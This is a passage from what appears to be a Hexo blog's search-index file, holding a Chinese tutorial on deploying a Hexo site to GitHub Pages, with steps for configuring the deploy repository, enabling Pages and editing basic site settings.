class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><h2 id="配置hexo的上传配置文件"><a href="#配置hexo的上传配置文件" class="headerlink" title="配置hexo的上传配置文件"></a>配置hexo的上传配置文件</h2><p>hexo的主配置文件为hexo根目录下_config文件</p><p>编辑打开这个文件，在文件最后找到Deplyment代码修改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;deployment.html</span><br><span class="line">deploy:</span><br><span class="line">  - type: git</span><br><span class="line">    repository: git@github.com:kinghtxg&#x2F;kinghtxg.github.io.git</span><br><span class="line">    branch: master</span><br></pre></td></tr></table></figure><p>将repository那一栏修改为自己仓库的ssh传输地址</p><h2 id="上传到github"><a href="#上传到github" class="headerlink" title="上传到github"></a>上传到github</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d &#x2F;&#x2F;上传文件</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/iJh6UiDad56zQotN.png!thumbnail" alt="图片"></p><h2 id="开启Web访问"><a href="#开启Web访问" class="headerlink" title="开启Web访问"></a>开启Web访问</h2><p>在项目仓库切换到Settings</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/GPaNXslwGzeoRoP3.png!thumbnail" alt="图片"></p><p>鼠标滚轮下翻，修改Pages为master branch如图(这里在创建空间命名时有点小问题，如果直接为kinghtxg.github.io则访问域名直接为kinghtxg.github.io)</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/51kSGbbsKsfsxpmm.png!thumbnail" alt="图片"></p><p>访问测试</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/UjwemRyKTX1ADY64.png!thumbnail" alt="图片"></p><h2 id="配置基础信息"><a href="#配置基础信息" class="headerlink" title="配置基础信息"></a>配置基础信息</h2><p>同样修改_config文件，我在我做了修改处的后面打上了备注，按需修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># Hexo Configuration</span><br><span class="line">## Docs: https:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;configuration.html</span><br><span class="line">## Source: https:&#x2F;&#x2F;github.com&#x2F;hexojs&#x2F;hexo&#x2F;</span><br><span class="line"></span><br><span class="line"># Site</span><br><span class="line">title: Kinght&#39;s blog  #博客名</span><br><span class="line">subtitle: 记录一些杂七杂八的笔记  #小标题</span><br><span class="line">description: &#39;&#39;</span><br><span class="line">keywords:</span><br><span class="line">author: Kinght   #作者</span><br><span class="line">language: zh-Hans  #中文</span><br><span class="line">timezone: Asia&#x2F;Shanghai  #时区上海</span><br><span class="line"></span><br><span class="line"># URL</span><br><span class="line">## If your site is put in a subdirectory, set url as &#39;http:&#x2F;&#x2F;yoursite.com&#x2F;child&#39; and root as &#39;&#x2F;child&#x2F;&#39;</span><br><span class="line">url: http:&#x2F;&#x2F;yoursite.com#网址</span><br><span class="line">root: &#x2F;</span><br><span class="line">permalink: archives&#x2F;:title.html  #修改链接格式</span><br><span class="line">permalink_defaults:</span><br><span class="line">pretty_urls:</span><br><span class="line">trailing_index: true # Set to false to remove trailing &#39;index.html&#39; from permalinks</span><br><span class="line">trailing_html: true # Set to false to remove trailing &#39;.html&#39; from permalinks</span><br></pre></td></tr></table></figure><p>cmd窗口进行配置文件更新</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &#x2F;&#x2F;清除文件</span><br><span class="line">hexo g &#x2F;&#x2F;更新缓存</span><br><span class="line">hexo d &#x2F;&#x2F;上传</span><br></pre></td></tr></table></figure><p>稍等几分钟（github page更新需要时间）</p>]]></content>
      
      
      <categories>
          
          <category> 系统运维 </category>
          
          <category> hexo相关 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
